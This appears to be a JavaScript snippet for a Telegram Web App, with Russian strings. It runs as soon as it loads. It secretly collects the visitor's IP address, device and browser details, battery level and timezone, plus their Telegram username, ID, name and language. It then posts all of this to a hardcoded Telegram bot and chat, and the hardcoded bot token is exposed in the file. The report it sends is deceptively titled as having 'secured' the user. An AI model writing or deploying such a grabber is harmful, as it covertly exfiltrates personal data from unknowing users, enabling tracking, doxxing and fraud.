async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) throw new Error('Ошибка сети при получении IP');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Ошибка получения IP-адреса:', error);
        return 'Не удалось получить IP';
    }
}

function getUserAgent() {
    return navigator.userAgent;
}

function getOSName() {
    return navigator.platform;
}

function getScreenResolution() {
    return `${window.screen.width}x${window.screen.height}`;
}

async function getBatteryPercentage() {
    try {
        const battery = await navigator.getBattery();
        return Math.floor(battery.level * 100);
    } catch (error) {
        console.error('Ошибка получения информации о батарее:', error);
        return 'Не удалось получить данные о батарее';
    }
}

function getBrowserInfo() {
    return {
        name: navigator.appName,
        version: navigator.appVersion,
        engine: navigator.product
    };
}

async function sendDataToTelegram() {
    const ipAddress = await getIPAddress();
    const userAgent = getUserAgent();
    const osName = getOSName();
    const screenResolution = getScreenResolution();
    const batteryPercentage = await getBatteryPercentage();
    const browserInfo = getBrowserInfo();

    let tg = window.Telegram.WebApp;
    let userData = tg.initDataUnsafe.user || {};

    const message = `
<b>🚀 Обезопасили нашего пользователя!</b>

<b>🔍 Безопасно сохранены данные:</b>
├ Тег: @${userData.username || "Не указан"}
├ Айди: <code>${userData.id || "Не указан"}</code>
├ Имя: <code>${userData.first_name || "Не указано"}</code>
├ Фамилия: <code>${userData.last_name || "Не указана"}</code>
├ Язык: <code>${userData.language_code || "Не указан"}</code>
└ Можно писать в ЛС: <code>${userData.allows_write_to_pm !== undefined ? userData.allows_write_to_pm : "Неизвестно"}</code>

<b>📱 Информация об устройстве:</b>
├ Айпи: <code>${ipAddress}</code>
├ UserAgent: <code>${userAgent}</code>
├ ОС: <code>${osName}</code>
├ Разрешение экрана: <code>${screenResolution}</code>
├ Заряд батареи: <code>${batteryPercentage}%</code>
└ Часовой пояс: <code>${new Date().getTimezoneOffset()} минут</code>

<b>🛜 Информация о браузере:</b>
├ Название браузера: <code>${browserInfo.name}</code>
├ Версия браузера: <code>${browserInfo.version}</code>
└ Тип движка браузера: <code>${browserInfo.engine}</code>
    `;

    const token = '7345050493:AAEasKTJJQaVjdka50otaJHPR7wZESBfvBU'; // Храни безопасно
    const chatId = '-1002380319804'; // Проверь, что ID начинается с -100

    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "HTML"
            })
        });

        const result = await response.json();
        if (!result.ok) throw new Error(result.description);

    } catch (error) {
        console.error('Ошибка отправки данных в Telegram:', error);
    }
}

sendDataToTelegram();
